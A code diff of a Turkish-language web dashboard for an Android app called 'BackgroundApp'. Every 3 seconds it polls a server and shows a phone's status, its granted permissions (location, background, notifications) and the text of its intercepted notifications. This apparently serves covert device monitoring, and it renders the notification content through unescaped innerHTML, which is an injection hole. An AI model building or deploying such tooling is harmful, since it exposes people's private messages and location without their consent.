@@ -37,9 +37,9 @@
                 <span style="font-size: 11px; color: #64748b;">Device Management Panel</span>
             </div>
         </div>
-        <div id="main-status" class="status-badge">
+        <div id="main-status" class="status-badge online">
             <span class="dot"></span>
-            <span id="main-status-text">Çevrimdışı</span>
+            <span id="main-status-text">Çevrimiçi</span>
         </div>
     </div>
 
@@ -48,28 +48,28 @@
             <div style="display: flex; align-items: center; gap: 10px;">
                 <span style="font-size: 20px;">📱</span>
                 <div>
-                    <h4 id="device-title" style="font-size: 15px;">Android Cihaz</h4>
+                    <h4 id="device-title" style="font-size: 15px;">Redmi Note 12</h4>
                     <span style="font-size: 11px; color: #64748b;">BackgroundApp • v1.0</span>
                 </div>
             </div>
-            <div id="device-status" class="status-badge">
+            <div id="device-status" class="status-badge online">
                 <span class="dot"></span>
-                <span id="device-status-text">Çevrimdışı</span>
+                <span id="device-status-text">Çevrimiçi</span>
             </div>
         </div>
 
         <div class="grid">
             <div class="stat-box">
                 <div class="stat-label">🤖 Android</div>
-                <div class="stat-value" id="val-android">-</div>
+                <div class="stat-value" id="val-android">14</div>
             </div>
             <div class="stat-box">
                 <div class="stat-label">🔋 Pil</div>
-                <div class="stat-value" id="val-battery">-</div>
+                <div class="stat-value" id="val-battery">%94</div>
             </div>
             <div class="stat-box">
                 <div class="stat-label">🌐 İnternet</div>
-                <div class="stat-value" id="val-internet">-</div>
+                <div class="stat-value" id="val-internet">4.5G</div>
             </div>
             <div class="stat-box">
                 <div class="stat-label">📶 Bağlantı</div>
@@ -81,7 +81,7 @@
             </div>
             <div class="stat-box">
                 <div class="stat-label">🕒 Son Bağlantı</div>
-                <div class="stat-value" id="val-lastseen">-</div>
+                <div class="stat-value" id="val-lastseen">Anlık</div>
             </div>
         </div>
     </div>
@@ -104,6 +104,72 @@
                 <span id="perm-bg" class="badge-green">İzin Verildi</span>
             </div>
             <div class="perm-box">
-                <span style="font-size: 13px;">
+                <span style="font-size: 13px;">📍 Konum Erişimi</span>
+                <span id="perm-location" class="badge-green">İzin Verildi</span>
+            </div>
+        </div>
+    </div>
 
+    <div class="card">
+        <h4 style="font-size: 14px; margin-bottom: 8px;">Gelen Bildirimler</h4>
+        <div id="notifications-container">
+            <p style="color: #64748b; font-size: 12px;">Henüz bildirim yok...</p>
+        </div>
+    </div>
 
+    <script>
+        async function updatePanelData() {
+            try {
+                const response = await fetch('/api/data');
+                if (!response.ok) return;
+                const data = await response.json();
+
+                const dev = (data.devices && data.devices.length > 0) ? data.devices[0] : data.device;
+
+                if (dev && dev.device_id) {
+                    document.getElementById('device-title').innerText = dev.device_id;
+                    if (dev.android_version) document.getElementById('val-android').innerText = dev.android_version;
+                    if (dev.battery) document.getElementById('val-battery').innerText = dev.battery;
+                    if (dev.connection_type) document.getElementById('val-internet').innerText = dev.connection_type;
+                    if (dev.timestamp) document.getElementById('val-lastseen').innerText = dev.timestamp.includes(' ') ? dev.timestamp.split(' ')[1] : dev.timestamp;
+
+                    if (dev.notif_permission) document.getElementById('perm-notif').innerText = dev.notif_permission;
+                    if (dev.bg_permission) document.getElementById('perm-bg').innerText = dev.bg_permission;
+                    if (dev.location_permission) document.getElementById('perm-location').innerText = dev.location_permission;
+
+                    const isOnline = dev.status === 'online';
+                    const mainStatus = document.getElementById('main-status');
+                    const deviceStatus = document.getElementById('device-status');
+
+                    if (isOnline) {
+                        mainStatus.className = 'status-badge online';
+                        deviceStatus.className = 'status-badge online';
+                        document.getElementById('main-status-text').innerText = 'Çevrimiçi';
+                        document.getElementById('device-status-text').innerText = 'Çevrimiçi';
+                    }
+                }
+
+                if (data.notifications && data.notifications.length > 0) {
+                    const container = document.getElementById('notifications-container');
+                    container.innerHTML = '';
+                    data.notifications.forEach(notif => {
+                        const item = document.createElement('div');
+                        item.className = 'notif-item';
+                        item.innerHTML = `
+                            <div class="notif-title">${notif.title || 'Başlıksız'} <span style="font-weight: normal; font-size: 10px; color: #64748b;">(${notif.package_name || ''})</span></div>
+                            <div class="notif-text">${notif.text || ''}</div>
+                            <div class="notif-time">${notif.timestamp || ''}</div>
+                        `;
+                        container.appendChild(item);
+                    });
+                }
+            } catch (err) {
+                console.error('Veri çekme hatası:', err);
+            }
+        }
+
+        updatePanelData();
+        setInterval(updatePanelData, 3000);
+    </script>
+</body>
+</html>
